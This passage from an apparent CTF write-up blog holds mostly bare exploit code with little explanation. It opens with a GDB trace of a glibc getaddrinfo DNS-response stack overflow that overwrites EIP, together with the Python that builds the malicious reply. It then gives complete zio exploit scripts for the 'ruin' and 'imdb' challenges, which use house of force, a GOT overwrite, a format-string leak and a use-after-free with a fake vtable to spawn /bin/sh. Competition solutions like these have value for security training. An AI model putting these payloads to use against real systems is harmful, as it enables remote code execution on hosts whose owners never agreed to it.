../sysdeps/posix/getaddrinfo.c:<span class="number">2323</span></span><br><span class="line"></span><br><span class="line">=&gt; <span class="number">0xb7ed9d23</span> &lt;__GI_getaddrinfo+<span class="number">227</span>&gt;:	<span class="keyword">call</span>   <span class="number">0xb7ed7470</span> &lt;gaih_inet&gt;</span><br><span class="line">=&gt; <span class="number">0xb7ed7470</span> &lt;gaih_inet&gt;:	<span class="keyword">push</span>   <span class="built_in">ebp</span></span><br><span class="line">Breakpoint <span class="number">2</span>, gaih_inet (name=<span class="number">0x8048643</span> <span class="string">"bigtang.org"</span>, service=<span class="number">0xbfffef80</span>, </span><br><span class="line">    req=<span class="number">0xbffff04c</span>, pai=<span class="number">0xbfffef70</span>, naddrs=<span class="number">0xbfffef7c</span>)</span><br><span class="line">    <span class="meta">at</span> ../sysdeps/posix/getaddrinfo.c:<span class="number">275</span></span><br><span class="line"></span><br><span class="line">=&gt; <span class="number">0xb7ed80c7</span> &lt;gaih_inet+<span class="number">3159</span>&gt;:	<span class="keyword">call</span>   <span class="built_in">edi</span></span><br><span class="line">=&gt; <span class="number">0xb7def4d0</span> &lt;_nss_dns_gethostbyname4_r&gt;:	<span class="keyword">push</span>   <span class="built_in">ebp</span></span><br><span class="line">_nss_dns_gethostbyname4_r (name=<span class="number">0x8048643</span> <span class="string">"bigtang.org"</span>, pat=<span class="number">0xbfffeecc</span>, </span><br><span class="line">    buffer=<span class="number">0xbfffe9e0</span> <span class="string">"\377\002"</span>, buflen=<span class="number">0x420</span>, errnop=<span class="number">0xbfffeed0</span>, </span><br><span class="line">    herrnop=<span class="number">0xbfffeedc</span>, ttlp=<span class="number">0x0</span>) <span class="meta">at</span> nss_dns/dns-host.c:<span class="number">284</span></span><br><span class="line"></span><br><span class="line">=&gt; <span class="number">0xb7def58b</span> &lt;_nss_dns_gethostbyname4_r+<span class="number">187</span>&gt;:	<span class="keyword">call</span>   <span class="number">0xb7dedb70</span> &lt;__libc_res_nsearch@plt&gt;</span><br><span class="line">=&gt; <span class="number">0xb7ddb240</span> &lt;__GI___libc_res_nsearch&gt;:	<span class="keyword">push</span>   <span class="built_in">ebp</span></span><br><span class="line">__GI___libc_res_nsearch (statp=<span class="number">0xb7fc1340</span> &lt;_res&gt;, name=<span class="number">0x8048643</span> <span class="string">"bigtang.org"</span>, </span><br><span class="line">    class=<span class="number">0x1</span>, type=<span class="number">0xf371</span>, </span><br><span class="line">    answer=<span class="number">0xbfffe150</span> <span class="string">"\207C\371VcX\276\070\363\004\016"</span>, anslen=<span class="number">0x800</span>, </span><br><span class="line">    answerp=<span class="number">0xbfffe97c</span>, answerp2=<span class="number">0xbfffe980</span>, nanswerp2=<span class="number">0xbfffe984</span>, </span><br><span class="line">    resplen2=<span class="number">0xbfffe988</span>, answerp2_malloced=<span class="number">0xbfffe98c</span>) <span class="meta">at</span> res_query.c:<span class="number">342</span></span><br><span class="line"></span><br><span class="line">=&gt; <span class="number">0xb7ddb4c6</span> &lt;__GI___libc_res_nsearch+<span class="number">646</span>&gt;:	</span><br><span class="line">    <span class="keyword">call</span>   <span class="number">0xb7ddaeb0</span> &lt;__libc_res_nquerydomain&gt;</span><br><span class="line">=&gt; <span class="number">0xb7ddaeb0</span> &lt;__libc_res_nquerydomain&gt;:	<span class="keyword">push</span>   <span class="built_in">ebp</span></span><br><span class="line">__libc_res_nquerydomain (statp=statp@entry=<span class="number">0xb7fc1340</span> &lt;_res&gt;, </span><br><span class="line">    name=name@entry=<span class="number">0x8048643</span> <span class="string">"bigtang.org"</span>, domain=<span class="number">0x0</span>, class=<span class="number">0x1</span>, </span><br><span class="line">    type=<span class="number">0xf371</span>, answer=<span class="number">0xbfffe150</span> <span class="string">"\207C\371VcX\276\070\363\004\016"</span>, </span><br><span class="line">    anslen=<span class="number">0x800</span>, answerp=<span class="number">0xbfffe97c</span>, answerp2=<span class="number">0xbfffe980</span>, </span><br><span class="line">    nanswerp2=<span class="number">0xbfffe984</span>, resplen2=<span class="number">0xbfffe988</span>, answerp2_malloced=<span class="number">0xbfffe98c</span>)</span><br><span class="line">    <span class="meta">at</span> res_query.c:<span class="number">563</span></span><br><span class="line"></span><br><span class="line">=&gt; <span class="number">0xb7ddaf9c</span> &lt;__libc_res_nquerydomain+<span class="number">236</span>&gt;:	</span><br><span class="line">    <span class="keyword">call</span>   <span class="number">0xb7dda7f0</span> &lt;__GI___libc_res_nquery&gt;</span><br><span class="line">=&gt; <span class="number">0xb7dda7f0</span> &lt;__GI___libc_res_nquery&gt;:	<span class="keyword">push</span>   <span class="built_in">ebp</span></span><br><span class="line">__GI___libc_res_nquery (statp=<span class="number">0xb7fc1340</span> &lt;_res&gt;, name=<span class="number">0x8048643</span> <span class="string">"bigtang.org"</span>, </span><br><span class="line">    class=<span class="number">0x1</span>, type=<span class="number">0xf371</span>, </span><br><span class="line">    answer=<span class="number">0xbfffe150</span> <span class="string">"\207C\371VcX\276\070\363\004\016"</span>, anslen=<span class="number">0x800</span>, </span><br><span class="line">    answerp=<span class="number">0xbfffe97c</span>, answerp2=<span class="number">0xbfffe980</span>, nanswerp2=<span class="number">0xbfffe984</span>, </span><br><span class="line">    resplen2=<span class="number">0xbfffe988</span>, answerp2_malloced=<span class="number">0xbfffe98c</span>) <span class="meta">at</span> res_query.c:<span class="number">124</span></span><br><span class="line"><span class="number">124</span>	<span class="keyword">in</span> res_query.c</span><br><span class="line"></span><br><span class="line">=&gt; <span class="number">0xb7dda969</span> &lt;__GI___libc_res_nquery+<span class="number">377</span>&gt;:	<span class="keyword">movzx</span>  <span class="built_in">ecx</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">edi</span>+<span class="number">0x3</span>]</span><br><span class="line"><span class="symbol">EAX:</span> <span class="number">0xbfffe980</span> (<span class="string">'B'</span> &lt;repeats <span class="number">200</span> <span class="built_in">times</span>&gt;...)</span><br><span class="line"><span class="symbol">EBX:</span> <span class="number">0xb7dea000</span> --&gt; <span class="number">0x14ed4</span> </span><br><span class="line"><span class="symbol">ECX:</span> <span class="number">0xbfffe980</span> (<span class="string">'B'</span> &lt;repeats <span class="number">200</span> <span class="built_in">times</span>&gt;...)</span><br><span class="line"><span class="symbol">EDX:</span> <span class="number">0x42424242</span> (<span class="string">'BBBB'</span>)</span><br><span class="line"><span class="symbol">ESI:</span> <span class="number">0xb7fc1340</span> --&gt; <span class="number">0x5</span> </span><br><span class="line"><span class="symbol">EDI:</span> <span class="number">0x42424242</span> (<span class="string">'BBBB'</span>)</span><br><span class="line"><span class="symbol">EBP:</span> <span class="number">0xbfffd7f8</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="symbol">ESP:</span> <span class="number">0xbfffd550</span> --&gt; <span class="number">0x16b04</span> </span><br><span class="line"><span class="symbol">EIP:</span> <span class="number">0xb7dda969</span> (&lt;__GI___libc_res_nquery+<span class="number">377</span>&gt;:	<span class="keyword">movzx</span>  <span class="built_in">ecx</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">edi</span>+<span class="number">0x3</span>])</span><br><span class="line"><span class="symbol"></span><br><span class="line"></span><br><span class="line">EAX:</span> <span class="number">0xbfffe980</span> (<span class="string">"fA;5A;"</span>...)</span><br><span class="line"><span class="symbol">EBX:</span> <span class="number">0xb7dea000</span> --&gt; <span class="number">0x14ed4</span> </span><br><span class="line"><span class="symbol">ECX:</span> <span class="number">0xbfffe980</span> (<span class="string">"fA;5A;"</span>...)</span><br><span class="line"><span class="symbol">EDX:</span> <span class="number">0x353b4166</span> (<span class="string">'fA;5'</span>)</span><br><span class="line"><span class="symbol">ESI:</span> <span class="number">0xb7fc1340</span> --&gt; <span class="number">0x5</span> </span><br><span class="line"><span class="symbol">EDI:</span> <span class="number">0x3b414a3b</span> (<span class="string">';JA;'</span>)</span><br><span class="line"><span class="symbol">EBP:</span> <span class="number">0xbfffd7f8</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="symbol">ESP:</span> <span class="number">0xbfffd550</span> --&gt; <span class="number">0x11035</span> </span><br><span class="line"><span class="symbol">EIP:</span> <span class="number">0xb7dda969</span> (&lt;__GI___libc_res_nquery+<span class="number">377</span>&gt;:	<span class="keyword">movzx</span>  <span class="built_in">ecx</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">edi</span>+<span class="number">0x3</span>])</span><br><span class="line"></span><br><span class="line"><span class="number">0x353b4166</span>  <span class="number">2090</span> <span class="number">0x3b414a3b</span>  <span class="number">2094</span></span><br><span class="line"><span class="symbol"></span><br><span class="line">EAX:</span> <span class="number">0x0</span> </span><br><span class="line"><span class="symbol">EBX:</span> <span class="number">0x42424242</span> (<span class="string">'BBBB'</span>)</span><br><span class="line"><span class="symbol">ECX:</span> <span class="number">0xb7fbe858</span> --&gt; <span class="number">0x804b000</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="symbol">EDX:</span> <span class="number">0x0</span> </span><br><span class="line"><span class="symbol">ESI:</span> <span class="number">0x42424242</span> (<span class="string">'BBBB'</span>)</span><br><span class="line"><span class="symbol">EDI:</span> <span class="number">0x42424242</span> (<span class="string">'BBBB'</span>)</span><br><span class="line"><span class="symbol">EBP:</span> <span class="number">0x42424242</span> (<span class="string">'BBBB'</span>)</span><br><span class="line"><span class="symbol">ESP:</span> <span class="number">0xbfffe9c0</span> --&gt; <span class="number">0x8044242</span> </span><br><span class="line"><span class="symbol">EIP:</span> <span class="number">0x42424242</span> (<span class="string">'BBBB'</span>)</span><br><span class="line"><span class="symbol">EFLAGS:</span> <span class="number">0x10286</span> (carry PARITY adjust <span class="meta">zero</span> SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid $PC address: <span class="number">0x42424242</span></span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line"><span class="number">0000</span>| <span class="number">0xbfffe9c0</span> --&gt; <span class="number">0x8044242</span> </span><br><span class="line"><span class="number">0004</span>| <span class="number">0xbfffe9c4</span> --&gt; <span class="number">0xbfffeecc</span> --&gt; <span class="number">0xbfffee10</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">0008</span>| <span class="number">0xbfffe9c8</span> --&gt; <span class="number">0xbfffe9e0</span> --&gt; <span class="number">0x2ff</span> </span><br><span class="line"><span class="number">0012</span>| <span class="number">0xbfffe9cc</span> --&gt; <span class="number">0x420</span> </span><br><span class="line"><span class="number">0016</span>| <span class="number">0xbfffe9d0</span> --&gt; <span class="number">0xbfffeed0</span> --&gt; <span class="number">0xb</span> (<span class="string">'\x0b'</span>)</span><br><span class="line"><span class="number">0020</span>| <span class="number">0xbfffe9d4</span> --&gt; <span class="number">0xbfffeedc</span> --&gt; <span class="number">0x2</span> </span><br><span class="line"><span class="number">0024</span>| <span class="number">0xbfffe9d8</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">0028</span>| <span class="number">0xbfffe9dc</span> --&gt; <span class="number">0x0</span> </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line"><span class="symbol">Legend:</span> code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line"><span class="number">0x42424242</span> <span class="keyword">in</span> ?? ()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   if data2:</span><br><span class="line">      data = <span class="string">''</span><br><span class="line">      data += dw(id2)</span><br><span class="line">      #data += '</span>\x00<span class="string">' * (2300)</span><br><span class="line">      data += '</span>A<span class="string">'*38</span><br><span class="line">      data += dd(0)+dd(0x31000000)</span><br><span class="line">      data += '</span>A<span class="string">'*(2090-46)</span><br><span class="line">      data += dd(0x08b00408)+dd(0x38b00408)</span><br><span class="line">      data += '</span>B<span class="string">'*62</span><br><span class="line">      data2_reply = dw(len(data)) + data</span></span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-BCTF-2016-ruin" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/03/23/BCTF-2016-ruin/" class="article-date">
  	<time datetime="2016-03-23T06:05:15.000Z" itemprop="datePublished">2016-03-23</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/03/23/BCTF-2016-ruin/">BCTF-2016-ruin</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>Download:<a href="http://bigtang.org/files/ruin.7b694dc96bf316a40ff7163479850f78">ruin.7b694dc96bf316a40ff7163479850f78</a> <a href="http://bigtang.org/files/ruin.idb">ruin.idb</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = zio((<span class="string">"127.0.0.1"</span>,<span class="number">2333</span>),print_read=RAW,print_write=RAW)</span><br><span class="line"><span class="comment">#io = zio(("166.111.132.49",9999))</span></span><br><span class="line"></span><br><span class="line">printf_plt = <span class="number">0x8594</span></span><br><span class="line">printf_got = <span class="number">0x00010F58</span></span><br><span class="line">printf_off = <span class="number">0x385c0</span></span><br><span class="line"></span><br><span class="line">atoi_got = <span class="number">0x10f80</span></span><br><span class="line">system_off   = <span class="number">0x2e7c8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkKey</span><span class="params">(key)</span>:</span></span><br><span class="line">	io.read_until(<span class="string">"please input your 8-bit key:"</span>)</span><br><span class="line">	io.write(key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">updateKey</span><span class="params">(key)</span>:</span></span><br><span class="line">	io.read_until(<span class="string">"Give me your choice(1-4):"</span>)</span><br><span class="line">	io.writeline(<span class="string">"1"</span>)</span><br><span class="line">	io.read_until(<span class="string">"enter the new 16-bit key:"</span>)</span><br><span class="line">	io.write(key)</span><br><span class="line">           </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editSecret</span><span class="params">(secret)</span>:</span></span><br><span class="line">	io.read_until(<span class="string">"Give me your choice(1-4):"</span>)</span><br><span class="line">	io.writeline(<span class="string">"2"</span>)</span><br><span class="line">	io.read_until(<span class="string">"please input your secret:"</span>)</span><br><span class="line">	io.writeline(secret)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signName</span><span class="params">(name)</span>:</span></span><br><span class="line">	io.read_until(<span class="string">"Give me your choice(1-4):"</span>)</span><br><span class="line">	io.writeline(<span class="string">"3"</span>)</span><br><span class="line">	io.read_until(<span class="string">"please input your name length:"</span>)</span><br><span class="line">	io.writeline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakHeap</span><span class="params">()</span>:</span></span><br><span class="line">	checkKey(<span class="string">"bigtang!"</span>)</span><br><span class="line">	io.read_until(<span class="string">"bigtang!"</span>)</span><br><span class="line">	addr = io.read_until(<span class="string">' is'</span>)[:<span class="number">-3</span>]</span><br><span class="line">	addr = addr.ljust(<span class="number">4</span>,<span class="string">'\x00'</span>)</span><br><span class="line">	heap = l32(addr)<span class="number">-0x8</span></span><br><span class="line">	<span class="keyword">if</span> heap:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"\n[+] Got Heap base: %x"</span> % heap</span><br><span class="line">		<span class="keyword">return</span> heap</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakLibc</span><span class="params">(heap)</span>:</span></span><br><span class="line">	checkKey(<span class="string">"security"</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># house of force</span></span><br><span class="line">	editSecret(l32(<span class="number">0xffffffff</span>).rjust(<span class="number">0x10</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">	signName(str(<span class="number">0x10fa0</span>-(heap+<span class="number">0x10</span>)))</span><br><span class="line">	updateKey((l32(atoi_got)+l32(<span class="number">0</span>)+l32(atoi_got)).rjust(<span class="number">0x10</span>,<span class="string">'\x00'</span>))</span><br><span class="line">	updateKey(l32(printf_plt).ljust(<span class="number">0x10</span>,<span class="string">'\x00'</span>))</span><br><span class="line">	<span class="comment">#raw_input()</span></span><br><span class="line">	io.read_until(<span class="string">"Give me your choice(1-4):"</span>)</span><br><span class="line">	io.writeline(<span class="string">"%6$s"</span>+l32(printf_got))</span><br><span class="line">	libc = l32(io.read(<span class="number">4</span>)) - printf_off - <span class="number">1</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"\n[+] Got Libc base: %x"</span> % libc</span><br><span class="line">	<span class="keyword">return</span> libc</span><br><span class="line"></span><br><span class="line">heap = leakHeap()</span><br><span class="line">libc = leakLibc(heap)</span><br><span class="line">system = libc + system_off</span><br><span class="line"><span class="comment">#editSecret(l32(libc+0x2e36c))</span></span><br><span class="line">editSecret(l32(system))</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">io.read_until(<span class="string">"Give me your choice(1-4):"</span>)</span><br><span class="line">io.writeline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"><span class="comment">#raw_input("[*] De<span class="doctag">bug:</span>")</span></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-Qiangwang-Cup-2015-imdb" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/03/21/Qiangwang-Cup-2015-imdb/" class="article-date">
  	<time datetime="2016-03-21T10:22:37.000Z" itemprop="datePublished">2016-03-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/03/21/Qiangwang-Cup-2015-imdb/">Qiangwang-Cup-2015-imdb</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>Download: <a href="http://bigtang.org/files/imdb.e31f5ffcdb6571a4e672382187bc6345">imdb.e31f5ffcdb6571a4e672382187bc6345</a><br><a href="http://bigtang.org/files/imdb.idb">imdb.idb</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">"192.168.33.10"</span></span><br><span class="line">port = <span class="number">2333</span></span><br><span class="line">io = zio((host,port),print_read=NONE,print_write=NONE)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add a TV</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addTV</span><span class="params">(name,season,rating,introduction)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">"Your choice? "</span>)</span><br><span class="line">    io.writelines([<span class="string">"1"</span>,name,season,rating,introduction])</span><br><span class="line"></span><br><span class="line"><span class="comment"># add a Movie</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addMovie</span><span class="params">(name,actors,rating,introduction)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">"Your choice? "</span>)</span><br><span class="line">    io.writelines([<span class="string">"2"</span>,name,actors,rating,introduction])</span><br><span class="line"></span><br><span class="line"><span class="comment"># remove an entry</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">removeEntry</span><span class="params">(name)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">"Your choice? "</span>)</span><br><span class="line">    io.writelines([<span class="string">"3"</span>,name])</span><br><span class="line"></span><br><span class="line"><span class="comment"># show all TV/Movie</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showAll</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#raw_input("DE<span class="doctag">BUG:</span>")</span></span><br><span class="line">    io.read_until(<span class="string">"Your choice? "</span>)</span><br><span class="line">    io.writeline(<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read any address</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readAddr</span><span class="params">(address)</span>:</span></span><br><span class="line">    addTV(<span class="string">"a"</span>*<span class="number">0x10</span>,<span class="string">"0"</span>,<span class="string">"100"</span>,<span class="string">"f"</span>*<span class="number">0x7f</span>)</span><br><span class="line">    addTV(<span class="string">"b"</span>*<span class="number">0x10</span>,<span class="string">"0"</span>,<span class="string">"100"</span>,<span class="string">"f"</span>*<span class="number">0x7f</span>)</span><br><span class="line">    addTV(<span class="string">"b"</span>*<span class="number">0x10</span>,<span class="string">"0"</span>,<span class="string">"100"</span>,<span class="string">"f"</span>*<span class="number">0x7f</span>)</span><br><span class="line">    removeEntry(<span class="string">"a"</span>*<span class="number">0x10</span>)</span><br><span class="line">    removeEntry(<span class="string">"b"</span>*<span class="number">0x10</span>)</span><br><span class="line">    fakeMovie  = <span class="string">""</span></span><br><span class="line">    fakeMovie += l64(<span class="number">0x4015b0</span>)</span><br><span class="line">    fakeMovie += (<span class="string">"b"</span>*<span class="number">16</span>).ljust(<span class="number">64</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    fakeMovie += (<span class="string">"f"</span>*<span class="number">0x80</span>)</span><br><span class="line">    fakeMovie += l64(<span class="number">0x42c80000</span>)</span><br><span class="line">    fakeMovie += l64(address)</span><br><span class="line">    <span class="keyword">assert</span> len(fakeMovie) == <span class="number">0xd8</span></span><br><span class="line">    addMovie(<span class="string">"a"</span>*<span class="number">0x10</span>,fakeMovie,<span class="string">"100"</span>,<span class="string">"f"</span>*<span class="number">0x7f</span>)</span><br><span class="line">    showAll()</span><br><span class="line">    io.read_until(<span class="string">"actors: "</span>)</span><br><span class="line">    io.read_until(<span class="string">"actors: "</span>)</span><br><span class="line">    leak = l64(io.readline().strip().ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="comment">#print "[*] Got [0x%x] 0x%x " % (address,leak)</span></span><br><span class="line">    removeEntry(<span class="string">"a"</span>*<span class="number">0x10</span>)</span><br><span class="line">    removeEntry(<span class="string">"b"</span>*<span class="number">0x10</span>)</span><br><span class="line">    <span class="keyword">return</span> leak</span><br><span class="line"></span><br><span class="line"><span class="comment"># call any address</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">callAddr</span><span class="params">(vtable,address)</span>:</span></span><br><span class="line">    addTV(<span class="string">"a"</span>*<span class="number">0x10</span>,<span class="string">"0"</span>,<span class="string">"100"</span>,<span class="string">"f"</span>*<span class="number">0x7f</span>)</span><br><span class="line">    addTV(<span class="string">"b"</span>*<span class="number">0x10</span>,<span class="string">"0"</span>,<span class="string">"100"</span>,<span class="string">"f"</span>*<span class="number">0x7f</span>)</span><br><span class="line">    addTV(<span class="string">"b"</span>*<span class="number">0x10</span>,<span class="string">"0"</span>,<span class="string">"100"</span>,<span class="string">"f"</span>*<span class="number">0x7f</span>)</span><br><span class="line">    removeEntry(<span class="string">"a"</span>*<span class="number">0x10</span>)</span><br><span class="line">    removeEntry(<span class="string">"b"</span>*<span class="number">0x10</span>)</span><br><span class="line">    fakeMovie  = <span class="string">""</span></span><br><span class="line">    fakeMovie += l64(vtable)</span><br><span class="line">    fakeMovie += (<span class="string">"b"</span>*<span class="number">16</span>).ljust(<span class="number">64</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    fakeMovie += (<span class="string">"f"</span>*<span class="number">0x80</span>)</span><br><span class="line">    fakeMovie += l64(<span class="number">0x42c80000</span>)</span><br><span class="line">    fakeMovie += l64(address)</span><br><span class="line">    <span class="keyword">assert</span> len(fakeMovie) == <span class="number">0xd8</span></span><br><span class="line">    addMovie(<span class="string">"a"</span>*<span class="number">0x10</span>,fakeMovie,<span class="string">"100"</span>,<span class="string">"f"</span>*<span class="number">0x7f</span>)</span><br><span class="line">    showAll()</span><br><span class="line"></span><br><span class="line">heap = readAddr(<span class="number">0x601dc0</span>) - <span class="number">0x10</span></span><br><span class="line">vtable = heap + <span class="number">0x1c0</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Got heap 0x%x"</span> % heap</span><br><span class="line"></span><br><span class="line">puts = readAddr(<span class="number">0x601c40</span>)</span><br><span class="line">libc = puts - <span class="number">0x6fe30</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Got libc_base 0x%x "</span> % (libc)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Got spawn_Shell 0x%x"</span> % (libc + <span class="number">0x46520</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">callAddr(vtable,libc + <span class="number">0x46520</span>)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/UAF/">UAF</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-RCTF-2015-Quals-pwn500" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/03/21/RCTF-2015-Quals-pwn500/" class="article-date">
  	<time datetime="2016-03-21T10:13:45.000Z" itemprop="datePublished">2016-03-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/03/21/RCTF-2015-Quals-pwn500/">RCTF-2015-Quals-pwn500</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>Download: <a href="http://bigtang.org/files/g27_9f47c9e9d3e7605f3bbdd4f92e51250d">g27_9f47c9e9d3e7605f3bbdd4f92e51250d</a><br><a href="http://bigtang.org/files/g27_9f47c9e9d3e7605f3bbdd4f92e51250d.idb">g27_9f47c9e9d3e7605f3bbdd4f92e51250d.idb</a></p>
</blockquote>
